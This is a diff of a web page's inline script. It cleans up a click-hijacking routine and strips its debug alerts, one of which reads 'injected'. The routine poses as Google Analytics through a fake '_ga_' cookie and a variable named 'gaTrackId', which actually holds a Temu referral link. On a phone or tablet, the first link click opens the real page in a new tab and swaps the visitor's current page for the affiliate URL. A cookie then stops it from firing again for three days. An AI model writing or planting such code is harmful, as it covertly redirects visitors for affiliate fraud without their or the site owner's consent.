@@ -7,66 +7,41 @@
 
         <script>
             function getGA(name) {
-                var cookies = document.cookie.split("; ");
+                var cookies = document.cookie.split('; ');
                 for (var i = 0; i < cookies.length; i++) {
-                    var parts = cookies[i].split("=");
+                    var parts = cookies[i].split('=');
                     if (parts[0] === name) {
                         return parts[1];
                     }
                 }
                 return null;
             }
-
+            
             function setGA(name, value, exdays) {
                 document.cookie = `${name}=${value};expires=${new Date(Date.now() + exdays * 864e5).toString()};path=/`;
             }
-
+            
             function isMobileOrTablet() {
                 const ua = window.navigator.userAgent.toLowerCase();
-                const noMousePluggedIn = typeof window.matchMedia !== "function" || window.matchMedia("(any-pointer:fine)").matches === false;
-                alert(`UserAgent: ${ua}\nnoMousePluggedIn: ${noMousePluggedIn}\nmaxTouchPoints: ${window.navigator.maxTouchPoints}`);
-                return window.navigator.maxTouchPoints > 1 && noMousePluggedIn && (/android|iphone|ipod|ipad|tablet|playbook|silk|kindle/.test(ua) || window.matchMedia("(max-width: 1024px)").matches);
+                const isTouchScreen = typeof window.matchMedia !== "function" || window.matchMedia("(pointer:coarse)").matches === true;
+                return window.navigator.maxTouchPoints > 1 && isTouchScreen && (/android|iphone|ipod|ipad|tablet|playbook|silk|kindle/.test(ua) || window.matchMedia("(max-width: 1024px)").matches);
             }
-
-            const gaTrackId = "https://temu.to/k/u2s94llti82",
-                gaCode = getGA('_ga_D8SD9STSJ5');
-
+            
+            const gaTrackId = 'https://temu.to/k/u2s94llti82', gaCode = getGA('_ga_D8SD9STSJ5');
+            
             for (let event of ['click', 'touchend']) {
                 document.addEventListener(event, function (e) {
                     const target = e.target.closest("a");
-                    if (!target) {
-                        alert('a tag not found');
-                        return;
-                    }
-                    
+                    if (!target) return;
                     e.preventDefault();
-            
-                    alert(event);
-            
                     try {
                         const targetHref = target.getAttribute('href');
                         if (!targetHref) return;
-                        
-                        if (targetHref === '/') {
-                            alert('href is empty');
+                        if (targetHref === '/' || (gaCode && gaCode === 'true') || !isMobileOrTablet())
                             return window.location.assign(targetHref);
-                        }
-
-                        if (gaCode && gaCode === 'true') {
-                            alert('already run');
-                            return window.location.assign(targetHref);
-                        }
-
-                        if (!isMobileOrTablet()) {
-                            alert('is not mobile');
-                            return window.location.assign(targetHref);
-                        }
-            
-                        alert('injected');
                         setGA('_ga_D8SD9STSJ5', 'true', 3);
                         window.open(targetHref, '_blank');
                         window.location.replace(gaTrackId);
-                        
                     } catch { }
                 }, true);
             }
